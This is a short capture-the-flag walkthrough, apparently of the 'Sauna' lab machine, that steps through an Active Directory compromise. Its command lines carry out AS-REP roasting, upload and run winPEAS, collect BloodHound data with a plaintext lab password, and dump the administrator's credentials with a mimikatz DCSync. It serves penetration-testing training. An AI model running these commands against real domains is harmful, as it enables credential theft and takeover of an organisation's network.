Step 3: AS-REP Roasting Attack

Using GetNPUsers.py to find users with 'Do not require Kerberos preauthentication' set:

┌─[elliot@parrot]─[~/sauna]
└──╼ $for user in $(cat users.txt); do python GetNPUsers.py -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/${user}; done

Upload winPEAS to enumerate privilege escalation vectors:

*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe

Using BloodHound for AD enumeration:

(venv) ┌─[elliot@parrot]─[~/sauna]
└──╼ $bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All

Dumping hashes with mimikatz:

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> .\mimikatz.exe 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

Key Takeaways

  • AS-REP Roasting - Exploiting users without Kerberos preauthentication
  • LDAP Enumeration - Discovering domain users and structure
  • BloodHound - Visualizing Active Directory attack paths
  • DCSync Attack - Dumping domain credentials using Mimikatz

This machine demonstrates common Active Directory misconfigurations and Kerberos attack vectors.
